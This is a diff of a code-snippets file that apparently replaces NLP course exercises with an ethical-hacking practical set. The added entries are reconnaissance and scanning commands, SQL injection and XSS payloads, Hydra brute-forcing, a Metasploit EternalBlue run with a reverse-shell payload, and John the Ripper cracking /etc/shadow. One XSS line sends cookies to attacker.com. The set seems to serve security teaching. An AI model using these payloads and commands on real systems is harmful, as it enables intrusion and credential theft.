@@ -16,968 +16,211 @@ export interface Snippet {
 export const snippets: Snippet[] = [
   {
     id: "prac-1",
-    title: "Prac 1 ( Preprocessing)",
-    description: "Preprocessing of text: Word Analysis (Tokenization, Filtration, word frequency, Stop Word Removal)",
-    language: "python",
-    tags: ["nltk", "nlp", "preprocessing", "tokenization"],
-    code: `import nltk
-nltk.download('punkt')
-nltk.download('punkt_tab')
-nltk.download('stopwords')
+    title: "Prac 1: Footprinting (Google Dorks)",
+    description: "Advanced search techniques for information gathering and reconnaissance using Google Search operators.",
+    language: "markdown",
+    tags: ["recon", "footprinting", "google-dorks", "information-gathering"],
+    code: `# 01. Display Facebook page of ruia csit
+inurl:facebook intext:ruia csit
+
+# 02. Display python programs in PDF format from tutorialspoint
+inurl:tutorialspoint intext:python filetype:pdf
+
+# 03. Display the images related to covid-19
+intitle:"covid-19" filetype:jpg
+
+# 04. Display all video and audio files related to nasa
+intext:"nasa" filetype:mp4 || mp3
+
+# 05. Display today's weather of Poland
+weather:Poland
+
+# 06. Display financial budget of 2024-25 in excel format
+filetype:xlsx financial budget 2024-25
+
+# 07. Display the route from mumbai to goa
+map:mumbai to goa
+
+# 08. Find the white paper for bitcoin
+intitle:Bitcoin filetype:pdf
+
+# 09. Display the PM oath ceremony of 2024
+intitle:PM oath ceremony
+
+# 10. Display the ATKT timetable of Ruia College
+site:ruiacollege.edu intext:ATKT timetable
 
 
-from nltk.tokenize import sent_tokenize
-
-text = """Hello Mr. Smith, how are you doing today? The weather is great, and city is awesome.
-The sky is pinkish-blue. You shouldn't eat cardboard"""
-
-tokenized_text = sent_tokenize(text)
-print("Sentence Tokenized Text:", tokenized_text)
+Traceroute-
+tracert google.com
 
 
-from nltk.tokenize import word_tokenize
-
-tokenized_word = word_tokenize(text)
-print("Word Tokenized:", tokenized_word)
+`,
 
 
-from nltk.probability import FreqDist
-
-fdist = FreqDist(tokenized_word)
-print("Frequency Distribution:", fdist)
-
-
-import matplotlib.pyplot as plt
-
-fdist.plot(30, cumulative=False)
-plt.show()
-
-
-from nltk.corpus import stopwords
-
-stop_words = set(stopwords.words("english"))
-
-filtered_sent = []
-for w in tokenized_word:
-    if w.lower() not in stop_words:
-        filtered_sent.append(w)
-
-print("Tokenized Word:", tokenized_word)
-print("Filtered Word:", filtered_sent)`,
   },
   {
     id: "prac-2",
-    title: "Prac 2 (Regex Regular Expressions)",
-    description: "Create Regular expressions in Python for detecting word patterns and tokenizing text.",
-    language: "python",
-    tags: ["regex", "python", "tokenization", "text-processing"],
-    code: `import re
+    title: "Prac 2: Network Scanning (Nmap)",
+    description: "Scan networks and systems to discover open ports, services, and operating systems.",
+    language: "bash",
+    tags: ["nmap", "scanning", "network-security"],
+    code: `# Basic scan of a single target
+nmap 192.168.1.1
 
-text = "Hello, my name is John Doe! I am learning Python, and it's fun 2 much."
+# Scan specific ports
+nmap -p 80,443,22 192.168.1.1
 
-word_pattern = r'\\b\\w+\\b'
-words = re.findall(word_pattern, text)
-print("Words:", words)
+# Service and OS detection
+nmap -sV -O 192.168.1.1
 
-pattern_start_with_p = r'\\bP\\w*\\b'
-p_words = re.findall(pattern_start_with_p, text)
-print("Words starting with 'P':", p_words)
+# Aggressive scan (A) with timing (T4)
+nmap -A -T4 scanme.nmap.org
 
-tokens = re.split(r'(\\W+)', text)
-print("Tokens:", [token.strip() for token in tokens if token.strip()]) 
-
-number_pattern = r'\\b\\d+\\b'
-numbers = re.findall(number_pattern, text)
-print("Numbers:", numbers)
-
-
-text_data = """101   COM   Computers
-205   MAT   Mathematics
-189   ENG    English"""
-
-print("Numbers found:", re.findall('[0-9]+', text_data))
-print("Course codes:", re.findall('[A-Z]{3}', text_data))
-print("Names:", re.findall('[A-Za-z]{4,}', text_data))
-
-
-course_pattern = r'([0-9]+)\\s*([A-Z]{3})\\s*([A-Za-z]{4,})'
-print("Grouped courses:", re.findall(course_pattern, text_data))
-
-print("Quantifiers match:", re.findall(r'Co+l', 'So Cooool Coool cool coool col'))
-print("Boundary match:", re.findall(r'\\btoy\\b', 'play toy broke toys'))
-
-
-emails = """zuck26@facebook.com
-page33@google.com
-jeff42@amazon.com"""
-email_pattern = r'(\\w+)@([A-Z0-9]+)\\.([A-Z]{2,4})'
-print("Emails found:", re.findall(email_pattern, emails, flags=re.IGNORECASE))
-
-
-tweet = '''Good advice! RT @TheNextWeb: What I would do differently if I was learning to code today http://t.co/lbwej0pxOd cc: @garybernhardt #rstats'''
-
-def clean_tweet(tweet):
-    tweet = re.sub(r'http\\S+\\s*', '', tweet)  
-    tweet = re.sub(r'RT|cc', '', tweet)  
-    tweet = re.sub(r'#\\S+', '', tweet)  
-    tweet = re.sub(r'@\\S+', '', tweet)  
-    tweet = re.sub(r'[%s]' % re.escape(r"""!"#$%&'()*+,-./:;<=>?@[\\]^_~\`{|}~"""), '', tweet)  
-    tweet = re.sub(r'\\s+', ' ', tweet)  
-    return tweet
-
-print("Cleaned Tweet:", clean_tweet(tweet))`,
+# Stealth scan (Syn scan)
+sudo nmap -sS target.com`,
   },
   {
     id: "prac-3",
-    title: "Prac 3 (Stemming, Lemmatization & Morphology)",
-    description: "Perform Stemming and Lemmatization on words and analyze morphological structures.",
-    language: "python",
-    tags: ["nltk", "stemming", "lemmatization", "morphology"],
-    code: `import nltk
-nltk.download('wordnet')
-nltk.download('punkt_tab')
-from nltk.stem import PorterStemmer
+    title: "Prac 3: Web Vulnerability Scanning (Nikto)",
+    description: "Perform web server security scanning to identify dangerous files, outdated software, and other problems.",
+    language: "bash",
+    tags: ["web-security", "vulnerability-scan", "nikto"],
+    code: `# Basic scan of a web server
+nikto -h http://example.com
 
-stemmer = PorterStemmer()
-words = ["running", "runner", "runs", "easily", "happier", "better"]
-stemmed_words = [stemmer.stem(word) for word in words]
-print("Stemmed:", stemmed_words)
+# Scan specific port
+nikto -h 192.168.1.1 -p 8080
 
-from nltk.stem import WordNetLemmatizer
-from nltk.corpus import wordnet
-lemmatizer = WordNetLemmatizer()
-lemmatized_words = [lemmatizer.lemmatize(word, pos=wordnet.VERB) for word in words]
-print("Lemmatized (Verb):", lemmatized_words)`,
-    sections: [
-      {
-        title: "Stemming & Lemmatization",
-        code: `import nltk
-nltk.download('wordnet')
-nltk.download('punkt_tab')
-from nltk.stem import PorterStemmer
+# Scan using SSL
+nikto -h https://example.com -ssl
 
-stemmer = PorterStemmer()
-words = ["running", "runner", "runs", "easily", "happier", "better"]
-stemmed_words = [stemmer.stem(word) for word in words]
-print("Stemmed:", stemmed_words)
-
-from nltk.stem import WordNetLemmatizer
-from nltk.corpus import wordnet
-lemmatizer = WordNetLemmatizer()
-lemmatized_words = [lemmatizer.lemmatize(word, pos=wordnet.VERB) for word in words]
-print("Lemmatized (Verb):", lemmatized_words)`,
-      },
-      {
-        title: "Morphology",
-        code: `import nltk
-from nltk.tag import RegexpTagger
-from nltk.tokenize import word_tokenize
-from nltk.corpus import wordnet
-import re
-import spacy
-
-sentence = "The cats were running quickly."
-tokens = word_tokenize(sentence)
-patterns = [
-    (r'.*ing$', 'VB'),
-    (r'.*ly$', 'RB'),
-    (r'.*es$', 'NNS'),
-]
-tagger = RegexpTagger(patterns)
-print("Tagged Tokens:", tagger.tag(tokens))
-
-nltk.download('wordnet')
-synsets = wordnet.synsets('running')
-if synsets:
-    print("Lemmas:", synsets[0].lemmas())
-
-def extract_suffixes(word):
-    suffixes = ['ing', 'ed', 'ly', 's']
-    for suffix in suffixes:
-        if word.endswith(suffix):
-            return suffix
-    return None
-
-words = ["running", "played", "happily", "cats", "jump"]
-print("Extracted Suffixes:", [extract_suffixes(w) for w in words])
-
-compound_words = ['sunflower', 'basketball', 'football', 'notebook', 'toothbrush']
-common_words = ['sun', 'flower', 'basket', 'ball', 'foot', 'book', 'tooth', 'brush']
-
-def split_compound_word(word, components):
-    for component in components:
-        if word.startswith(component):
-            remaining = word[len(component):]
-            if remaining in components:
-                return component, remaining
-    return word
-
-print("Split Compounds:", {w: split_compound_word(w, common_words) for w in compound_words})
-
-try:
-    nlp = spacy.load("en_core_web_sm")
-    doc = nlp("The football players were practicing on the basketball court.")
-    for token in doc:
-        if token.dep_ == "compound":
-            print(f"Compound word found: {token.text} -> Head: {token.head.text}")
-except:
-    print("Spacy model 'en_core_web_sm' not found.")`,
-      },
-      {
-        title: "Stem, Lem & Morph",
-        code: `import nltk
-from nltk.stem import PorterStemmer, WordNetLemmatizer
-from nltk.corpus import wordnet
-from nltk.tag import RegexpTagger
-from nltk.tokenize import word_tokenize
-import re
-import spacy
-
-# --- STEMMING & LEMMATIZATION ---
-nltk.download('wordnet')
-nltk.download('punkt_tab')
-
-stemmer = PorterStemmer()
-words = ["running", "runner", "runs", "easily", "happier", "better"]
-stemmed_words = [stemmer.stem(word) for word in words]
-print("Stemmed:", stemmed_words)
-
-lemmatizer = WordNetLemmatizer()
-lemmatized_words = [lemmatizer.lemmatize(word, pos=wordnet.VERB) for word in words]
-print("Lemmatized (Verb):", lemmatized_words)
-
-# --- MORPHOLOGY ---
-sentence = "The cats were running quickly."
-tokens = word_tokenize(sentence)
-patterns = [
-    (r'.*ing$', 'VB'),
-    (r'.*ly$', 'RB'),
-    (r'.*es$', 'NNS'),
-]
-tagger = RegexpTagger(patterns)
-print("\\nTagged Tokens:", tagger.tag(tokens))
-
-synsets = wordnet.synsets('running')
-if synsets:
-    print("Lemmas:", synsets[0].lemmas())
-
-def extract_suffixes(word):
-    suffixes = ['ing', 'ed', 'ly', 's']
-    for suffix in suffixes:
-        if word.endswith(suffix):
-            return suffix
-    return None
-
-test_words = ["running", "played", "happily", "cats", "jump"]
-print("Extracted Suffixes:", [extract_suffixes(w) for w in test_words])
-
-compound_words = ['sunflower', 'basketball', 'football', 'notebook', 'toothbrush']
-common_words = ['sun', 'flower', 'basket', 'ball', 'foot', 'book', 'tooth', 'brush']
-
-def split_compound_word(word, components):
-    for component in components:
-        if word.startswith(component):
-            remaining = word[len(component):]
-            if remaining in components:
-                return component, remaining
-    return word
-
-print("Split Compounds:", {w: split_compound_word(w, common_words) for w in compound_words})
-
-try:
-    nlp = spacy.load("en_core_web_sm")
-    doc = nlp("The football players were practicing on the basketball court.")
-    for token in doc:
-        if token.dep_ == "compound":
-            print(f"Compound word found: {token.text} -> Head: {token.head.text}")
-except:
-    print("Spacy model 'en_core_web_sm' not found.")`,
-      },
-    ],
+# Export results to a file
+nikto -h http://example.com -o results.html -Format htm`,
   },
   {
     id: "prac-4",
-    title: "Prac 4 (Edit Distance & Weighted Edit Distance)",
-    description: "Calculate standard Levenshtein distance and weighted edit distance between strings.",
-    language: "python",
-    tags: ["nltk", "edit-distance", "algorithms"],
-    code: `def edit_distance(s1, s2):
-    m, n = len(s1), len(s2)
-    dp = [[0] * (n + 1) for _ in range(m + 1)]
-    for i in range(m + 1): dp[i][0] = i 
-    for j in range(n + 1): dp[0][j] = j  
-    for i in range(1, m + 1):
-        for j in range(1, n + 1):
-            if s1[i - 1] == s2[j - 1]:
-                dp[i][j] = dp[i - 1][j - 1] 
-            else:
-                dp[i][j] = min(dp[i - 1][j] + 1, dp[i][j - 1] + 1, dp[i - 1][j - 1] + 1)
-    return dp[m][n]`,
-    sections: [
-      {
-        title: "Edit Distance",
-        code: `def edit_distance(s1, s2):
-    m, n = len(s1), len(s2)
-    dp = [[0] * (n + 1) for _ in range(m + 1)]
+    title: "Prac 4: SQL Injection (SQLi)",
+    description: "Common SQL injection payloads and testing techniques for database vulnerabilities.",
+    language: "sql",
+    tags: ["exploitation", "sqli", "database", "web-security"],
+    code: `-- Authentication Bypass
+' OR '1'='1' --
+" OR "1"="1" --
+admin' --
 
-    for i in range(m + 1):
-        dp[i][0] = i 
-    for j in range(n + 1):
-        dp[0][j] = j  
+-- Union Based SQLi (finding columns)
+' UNION SELECT 1,2,3,4 --
 
-    for i in range(1, m + 1):
-        for j in range(1, n + 1):
-            if s1[i - 1] == s2[j - 1]:
-                dp[i][j] = dp[i - 1][j - 1] 
-            else:
-                dp[i][j] = min(
-                    dp[i - 1][j] + 1, 
-                    dp[i][j - 1] + 1,  
-                    dp[i - 1][j - 1] + 1 
-                )
+-- Database Version Fingerprinting
+' UNION SELECT @@version, NULL --
 
-    print("Edit Distance Matrix:")
-    for row in dp:
-        print(row)
-
-    return dp[m][n]
-
-s1 = "kitten"
-s2 = "sitting"
-edit_distance_result = edit_distance(s1, s2)
-print("\\nEdit Distance:", edit_distance_result)`,
-      },
-      {
-        title: "Weighted Edit Distance",
-        code: `def weighted_edit_distance(s1, s2, ins_cost=1, del_cost=1, sub_cost=1):
-    m, n = len(s1), len(s2)
-    dp = [[0] * (n + 1) for _ in range(m + 1)]
-
-    for i in range(m + 1):
-        dp[i][0] = i * del_cost  
-    for j in range(n + 1):
-        dp[0][j] = j * ins_cost  
-
-    for i in range(1, m + 1):
-        for j in range(1, n + 1):
-            if s1[i - 1] == s2[j - 1]:
-                dp[i][j] = dp[i - 1][j - 1]  
-            else:
-                dp[i][j] = min(
-                    dp[i - 1][j] + del_cost,  
-                    dp[i][j - 1] + ins_cost,  
-                    dp[i - 1][j - 1] + sub_cost  
-                )
-
-    print("Weighted Edit Distance Matrix:")
-    for row in dp:
-        print(row)
-
-    return dp[m][n]
-
-s1 = "kitten"
-s2 = "sitting"
-insertion_cost = 1
-deletion_cost = 1
-substitution_cost = 2
-
-weighted_edit_distance_result = weighted_edit_distance(s1, s2, ins_cost=insertion_cost, del_cost=deletion_cost, sub_cost=substitution_cost)
-print("\\nWeighted Edit Distance:", weighted_edit_distance_result)`,
-      },
-    ],
+-- Extracting Table Names (MySQL)
+' UNION SELECT table_name, NULL FROM information_schema.tables --`,
   },
   {
     id: "prac-5",
-    title: "Prac 5 (N-grams, Prefix & Suffix)",
-    description: "Generate N-grams and extract word affixes (prefixes and suffixes).",
-    language: "python",
-    tags: ["nltk", "textblob", "n-grams"],
-    code: `from textblob import TextBlob
-sentence = "Technology is best when it brings people together"
-ngram_object = TextBlob(sentence)
-print(ngram_object.ngrams(n=2))`,
-    sections: [
-      {
-        title: "Bigram & Trigram",
-        code: `import nltk
-nltk.download('punkt')
-nltk.download('punkt_tab')
-from textblob import TextBlob
+    title: "Prac 5: Cross-Site Scripting (XSS)",
+    description: "Payloads for testing Reflected, Stored, and DOM-based XSS vulnerabilities.",
+    language: "html",
+    tags: ["xss", "web-security", "javascript"],
+    code: `<!-- Standard Alert Payload -->
+<script>alert('XSS')</script>
 
-sentence = "Technology is best when it brings people together"
-ngram_object = TextBlob(sentence)
+<!-- Using image source for bypass -->
+<img src=x onerror=alert(1)>
 
-bigrams = ngram_object.ngrams(n=2) 
-print(f"Bigrams: {bigrams}")
+<!-- Cookie Stealing (PoC) -->
+<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>
 
-trigrams = ngram_object.ngrams(n=3) 
-print(f"Trigrams: {trigrams}")`,
-      },
-      {
-        title: "Suffix & Prefix",
-        code: `import random
-from collections import defaultdict
-
-def generate_word_ngrams(text, n):
-    words = text.split()
-    return list(zip(*[words[i:] for i in range(n)]))
-
-def build_word_ngram_model(text, n):
-    model = defaultdict(list)
-    ngrams = generate_word_ngrams(text, n)
-    for ngram in ngrams:
-        prefix = tuple(ngram[:-1])
-        suffix = ngram[-1]
-        model[prefix].append(suffix)
-    return model
-
-def generate_word_text(model, n, length=10):
-    prefix = random.choice(list(model.keys()))
-    generated = list(prefix)
-    print("\\n--- WORD GENERATION PROCESS ---")
-    for _ in range(length - n + 1):
-        suffixes = model.get(prefix, [])
-        if suffixes:
-            suffix = random.choice(suffixes)
-            print(f"Prefix {prefix} -> Suffix FOUND: {suffix}")
-            generated.append(suffix)
-            prefix = tuple(generated[-(n-1):])
-        else:
-            print(f"Prefix {prefix} -> NO SUFFIX FOUND")
-            break
-    return ' '.join(generated)
-
-def generate_char_ngrams(text, n):
-    return list(zip(*[text[i:] for i in range(n)]))
-
-def build_char_ngram_model(text, n):
-    model = defaultdict(list)
-    ngrams = generate_char_ngrams(text, n)
-    for ngram in ngrams:
-        prefix = tuple(ngram[:-1])
-        suffix = ngram[-1]
-        model[prefix].append(suffix)
-    return model
-
-def generate_char_text(model, n, length=50):
-    prefix = random.choice(list(model.keys()))
-    generated = ''.join(prefix)
-    print("\\n-- CHAR GENERATION PROCESS --")
-    for _ in range(length - n + 1):
-        suffixes = model.get(prefix, [])
-        if suffixes:
-            suffix = random.choice(suffixes)
-            print(f"Prefix {prefix} -> Suffix FOUND: {suffix}")
-            generated += suffix
-            prefix = tuple(generated[-(n-1):])
-        else:
-            print(f"Prefix {prefix} -> NO SUFFIX FOUND (switching prefix)")
-            prefix = random.choice(list(model.keys()))
-            continue
-    return generated
-
-text1 = "I am learning machine learning and natural language processing"
-n1 = 3
-word_model = build_word_ngram_model(text1, n1)
-print("Word N-gram Model:\\n", dict(word_model))
-print("Generated Word Text:", generate_word_text(word_model, n1, length=10))
-
-text2 = "hello world, welcome to the n-gram model!"
-n2 = 4
-char_model = build_char_ngram_model(text2, n2)
-print("\\nChar N-gram Model:\\n", dict(char_model))
-print("Generated Char Text:", generate_char_text(char_model, n2, length=50))`,
-      },
-      {
-        title: "Bi, Tri & Suffix",
-        code: `import nltk
-nltk.download('punkt')
-nltk.download('punkt_tab')
-from textblob import TextBlob
-
-sentence = "Technology is best when it brings people together"
-ngram_object = TextBlob(sentence)
-
-bigrams = ngram_object.ngrams(n=2) 
-print(f"Bigrams: {bigrams}")
-
-trigrams = ngram_object.ngrams(n=3) 
-print(f"Trigrams: {trigrams}")
-
-import random
-from collections import defaultdict
-
-def generate_word_ngrams(text, n):
-    words = text.split()
-    return list(zip(*[words[i:] for i in range(n)]))
-
-def build_word_ngram_model(text, n):
-    model = defaultdict(list)
-    ngrams = generate_word_ngrams(text, n)
-    for ngram in ngrams:
-        prefix = tuple(ngram[:-1])
-        suffix = ngram[-1]
-        model[prefix].append(suffix)
-    return model
-
-def generate_word_text(model, n, length=10):
-    prefix = random.choice(list(model.keys()))
-    generated = list(prefix)
-    print("\\n--- WORD GENERATION PROCESS ---")
-    for _ in range(length - n + 1):
-        suffixes = model.get(prefix, [])
-        if suffixes:
-            suffix = random.choice(suffixes)
-            print(f"Prefix {prefix} -> Suffix FOUND: {suffix}")
-            generated.append(suffix)
-            prefix = tuple(generated[-(n-1):])
-        else:
-            print(f"Prefix {prefix} -> NO SUFFIX FOUND")
-            break
-    return ' '.join(generated)
-
-def generate_char_ngrams(text, n):
-    return list(zip(*[text[i:] for i in range(n)]))
-
-def build_char_ngram_model(text, n):
-    model = defaultdict(list)
-    ngrams = generate_char_ngrams(text, n)
-    for ngram in ngrams:
-        prefix = tuple(ngram[:-1])
-        suffix = ngram[-1]
-        model[prefix].append(suffix)
-    return model
-
-def generate_char_text(model, n, length=50):
-    prefix = random.choice(list(model.keys()))
-    generated = ''.join(prefix)
-    print("\\n-- CHAR GENERATION PROCESS --")
-    for _ in range(length - n + 1):
-        suffixes = model.get(prefix, [])
-        if suffixes:
-            suffix = random.choice(suffixes)
-            print(f"Prefix {prefix} -> Suffix FOUND: {suffix}")
-            generated += suffix
-            prefix = tuple(generated[-(n-1):])
-        else:
-            print(f"Prefix {prefix} -> NO SUFFIX FOUND (switching prefix)")
-            prefix = random.choice(list(model.keys()))
-            continue
-    return generated
-
-text1 = "I am learning machine learning and natural language processing"
-n1 = 3
-word_model = build_word_ngram_model(text1, n1)
-print("Word N-gram Model:\\n", dict(word_model))
-print("Generated Word Text:", generate_word_text(word_model, n1, length=10))
-
-text2 = "hello world, welcome to the n-gram model!"
-n2 = 4
-char_model = build_char_ngram_model(text2, n2)
-print("\\nChar N-gram Model:\\n", dict(char_model))
-print("Generated Char Text:", generate_char_text(char_model, n2, length=50))`,
-      },
-    ],
+<!-- SVG Payload -->
+<svg onload=alert(1)>`,
   },
   {
     id: "prac-6",
-    title: "Prac 6 POS (Brown, Tagger, Spacy)",
-    description: "POS tagging comparison using Brown, Perceptron, and Spacy models.",
-    language: "python",
-    tags: ["nltk", "spacy", "pos-tagging"],
-    code: `!pip install spacy pandas
-!python -m spacy download en_core_web_sm
+    title: "Prac 6: Password Cracking (Hydra)",
+    description: "Brute-force login credentials for various protocols like SSH, FTP, and HTTP.",
+    language: "bash",
+    tags: ["bruteforce", "hydra", "passwords"],
+    code: `# Crack SSH with a username and a wordlist
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
 
-import nltk
-import spacy
-import pandas as pd
-from nltk.corpus import brown
-from IPython.display import display
+# Crack FTP with a list of users and passwords
+hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 
-nltk.download('punkt')
-nltk.download('punkt_tab')
-nltk.download('brown')
-nltk.download('universal_tagset')
-nltk.download('averaged_perceptron_tagger')
-nltk.download('averaged_perceptron_tagger_eng')
-
-sentence = "The quick brown fox jumps over the lazy dog."
-
-tokens = nltk.word_tokenize(sentence)
-
-nltk_tags = nltk.pos_tag(tokens)
-df_nltk = pd.DataFrame(nltk_tags, columns=["Word", "POS Tag"])
-print("NLTK POS TAGGING")
-display(df_nltk)
-
-brown_tagged = brown.tagged_sents(tagset='universal')[0]
-df_brown = pd.DataFrame(brown_tagged, columns=["Word", "Universal POS"])
-print("BROWN CORPUS (UNIVERSAL TAGSET)")
-display(df_brown.head(15))
-
-df_perc = pd.DataFrame(nltk_tags, columns=["Word", "Perceptron Tag"])
-print("AVERAGED PERCEPTRON TAGGER")
-display(df_perc)
-
-nlp = spacy.load("en_core_web_sm")
-doc = nlp(sentence)
-
-spacy_data = [(token.text, token.pos_, token.dep_) for token in doc]
-df_spacy = pd.DataFrame(spacy_data, columns=["Word", "POS", "Dependency"])
-print("SPACY POS TAGGING")
-display(df_spacy)`,
+# Web Login Form (POST)
+hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"`,
   },
   {
     id: "prac-7",
-    title: "Prac 7 (Text to Speech & Accuracy)",
-    description: "Convert text to speech, then back to text, and calculate accuracy.",
-    language: "python",
-    tags: ["gtts", "speech-recognition", "colab"],
-    code: `!pip install gTTS SpeechRecognition pydub
-!apt-get install ffmpeg -y
+    title: "Prac 7: Banner Grabbing & Service Detection",
+    description: "Techniques to identify service versions and software running on open ports.",
+    language: "bash",
+    tags: ["recon", "banner-grabbing", "netcat"],
+    code: `# Using Netcat for banner grabbing
+nc -v 192.168.1.1 80
+HEAD / HTTP/1.0
 
-from gtts import gTTS
-from IPython.display import Audio
-from pydub import AudioSegment
-import speech_recognition as sr
-from google.colab import files
-from difflib import SequenceMatcher
+# Using Telnet
+telnet 192.168.1.1 21
 
-def text_to_speech(text):
-    tts = gTTS(text=text, lang='en')
-    tts.save("output.mp3")
-    return "output.mp3"
-
-text = "Hello, how are you doing today?"
-mp3_file = text_to_speech(text)
-
-display(Audio(mp3_file))
-
-def convert_mp3_to_wav(mp3_file, wav_file):
-    audio = AudioSegment.from_mp3(mp3_file)
-    audio.export(wav_file, format="wav")
-
-convert_mp3_to_wav(mp3_file, "output.wav")
-
-def speech_to_text(file_path):
-    recognizer = sr.Recognizer()
-    with sr.AudioFile(file_path) as source:
-        audio = recognizer.record(source)
-
-    try:
-        return recognizer.recognize_google(audio)
-    except:
-        return ""
-
-print("Upload WAV file:")
-uploaded = files.upload()
-
-recognized_text = ""
-
-for fn in uploaded.keys():
-    recognized_text = speech_to_text(fn)
-    print("Recognized Text:", recognized_text)
-
-def calculate_accuracy(original_text, recognized_text):
-    return SequenceMatcher(None, original_text.lower(), recognized_text.lower()).ratio() * 100
-
-if recognized_text:
-    accuracy = calculate_accuracy(text, recognized_text)
-    print(f"Accuracy: {accuracy:.2f}%")
-else:
-    print("No valid speech recognized.")`,
+# Using Curl to see HTTP headers
+curl -I http://example.com`,
   },
   {
     id: "prac-8",
-    title: "Prac 8 (Simple Chatbot)",
-    description: "A rule-based chatbot using regex and random responses.",
+    title: "Prac 8: Python Scapy for Packet Sniffing",
+    description: "Basic packet sniffing and analysis using the Scapy library in Python.",
     language: "python",
-    tags: ["python", "regex", "chatbot"],
-    code: `import random
-import re
+    tags: ["python", "scapy", "sniffing", "network"],
+    code: `from scapy.all import sniff, IP, TCP
 
-greetings = ['hi', 'hello', 'hey', 'hola']
+def packet_callback(packet):
+    if packet.haslayer(IP):
+        ip_layer = packet.getlayer(IP)
+        print(f"New Packet: {ip_layer.src} -> {ip_layer.dst}")
 
-responses = {
-    'how are you': ['I am doing well, thank you!', 'I am fine! How about you?'],
-    'what is your name': ['I am a simple chatbot!', 'You can call me ChatBot.'],
-    'bye': ['Goodbye! Have a great day!', 'See you later!'],
-    'default': ["I'm not sure how to respond to that. Can you ask something else?"]
-}
-
-def clean_text(text):
-    return re.sub(r'[^\\w\\s]', '', text.lower())
-
-def greet(user_input):
-    for word in user_input.split():
-        if word in greetings:
-            return random.choice(['Hello!', 'Hi there!', 'Hey!'])
-    return None
-
-def get_response(user_input):
-    user_input = clean_text(user_input)
-
-    greeting_response = greet(user_input)
-    if greeting_response:
-        return greeting_response
-
-    for key in responses:
-        if key in user_input:
-            return random.choice(responses[key])
-
-    return random.choice(responses['default'])
-
-def chatbot():
-    print("Chatbot: Hi! How can I help you today? Type 'bye' to exit.")
-
-    while True:
-        user_input = input("You: ")
-
-        if clean_text(user_input) == 'bye':
-            print("Chatbot:", random.choice(responses['bye']))
-            break
-
-        response = get_response(user_input)
-        print("Chatbot:", response)
-
-if __name__ == "__main__":
-    chatbot()`,
+# Sniff 10 packets
+sniff(filter="ip", prn=packet_callback, count=10)`,
   },
   {
     id: "prac-9",
-    title: "Prac 9 (ASR NLP )",
-    description: "Automatic Speech Recognition integrated with a complete NLP preprocessing pipeline.",
-    language: "python",
-    tags: ["speech-recognition", "asr", "nlp-pipeline"],
-    code: `!pip install SpeechRecognition pydub nltk
-!apt-get install ffmpeg -y
+    title: "Prac 9: Metasploit Framework (MSF)",
+    description: "Introduction to basic Metasploit commands for exploit search and execution.",
+    language: "bash",
+    tags: ["metasploit", "exploitation", "framework"],
+    code: `# Start metasploit console
+msfconsole
 
-import nltk
-import speech_recognition as sr
-from google.colab import files
-from nltk.tokenize import word_tokenize
-from nltk.corpus import stopwords
-from nltk.stem import PorterStemmer, WordNetLemmatizer
+# Search for an exploit
+search eternalblue
 
-nltk.download('punkt')
-nltk.download('punkt_tab')
-nltk.download('stopwords')
-nltk.download('wordnet')
-nltk.download('averaged_perceptron_tagger')
-nltk.download('averaged_perceptron_tagger_eng')
+# Use a specific exploit
+use exploit/windows/smb/ms17_010_eternalblue
 
-def asr_nlp_pipeline(audio_file):
-    r = sr.Recognizer()
+# Set target and payload
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
 
-    try:
-        with sr.AudioFile(audio_file) as source:
-            r.adjust_for_ambient_noise(source)
-            audio = r.record(source)
-
-        text = r.recognize_google(audio)
-    except:
-        print("Could not recognize audio")
-        return "", [], [], [], [], []
-
-    tokens = word_tokenize(text.lower())
-
-    stop_words = set(stopwords.words("english"))
-    filtered_words = [w for w in tokens if w.isalpha() and w not in stop_words]
-
-    ps = PorterStemmer()
-    stemmed_words = [ps.stem(w) for w in filtered_words]
-
-    lemmatizer = WordNetLemmatizer()
-    lemmatized_words = [lemmatizer.lemmatize(w) for w in filtered_words]
-
-    pos_tags = nltk.pos_tag(filtered_words)
-
-    return text, tokens, filtered_words, stemmed_words, lemmatized_words, pos_tags
-
-
-print("Upload your WAV file:")
-uploaded = files.upload()
-
-for filename in uploaded.keys():
-    text, tokens, filtered, stemmed, lemmatized, pos = asr_nlp_pipeline(filename)
-
-    print("\\nRecognized Text:", text)
-    print("Tokens:", tokens)
-    print("After Stopword Removal:", filtered)
-    print("Stemmed Words:", stemmed)
-    print("Lemmatized Words:", lemmatized)
-    print("POS Tags:", pos)`,
+# Execute exploit
+exploit`,
   },
   {
     id: "prac-10",
-    title: "Prac 10 (Emotion Detection)",
-    description: "Detect emotions in speech using Word2Vec and GloVe embedding models.",
-    language: "python",
-    tags: ["whisper", "word2vec", "emotion-detection"],
-    code: `import whisper
-model = whisper.load_model("base")
-result = model.transcribe("sample.wav")
-print(result["text"])`,
-    sections: [
-      {
-        title: "Word2Vec Emotion",
-        code: `!pip install -q openai-whisper gensim scikit-learn gTTS
-!apt-get install -y ffmpeg
+    title: "Prac 10: Hash Cracking (John the Ripper)",
+    description: "Offline password cracking for various hash types like MD5, SHA1, and Linux shadow files.",
+    language: "bash",
+    tags: ["john", "hashing", "passwords"],
+    code: `# Crack a simple MD5 hash
+echo "5d41402abc4b2a76b9719d911017c592" > hash.txt
+john --format=raw-md5 hash.txt
 
-from gtts import gTTS
-import whisper
-from gensim.models import Word2Vec
-import numpy as np
-from sklearn.linear_model import LogisticRegression
+# Crack Linux shadow file
+sudo unshadow /etc/passwd /etc/shadow > myhashes.txt
+john myhashes.txt
 
-text = "I am very happy"
-tts = gTTS(text=text, lang='en')
-tts.save("sample.wav")
-
-print("Voice sample saved")
-
-model = whisper.load_model("base")
-
-result = model.transcribe("sample.wav")
-transcribed_text = result["text"]
-
-print("Transcribed Text:", transcribed_text)
-
-sentences = [
-    "I am extremely happy and joyful",
-    "This is a wonderful and exciting day",
-    "I feel cheerful and energetic",
-    "I feel very sad and depressed",
-    "I am feeling hopeless and tired",
-    "This makes me want to cry",
-    "I am angry and frustrated",
-    "This situation makes me furious",
-    "I am irritated and annoyed",
-    "I feel scared and afraid",
-    "This is terrifying and frightening",
-    "I am nervous and anxious"
-]
-
-tokenized = [s.lower().split() for s in sentences]
-
-w2v_model = Word2Vec(
-    sentences=tokenized,
-    vector_size=100,
-    window=5,
-    min_count=1,
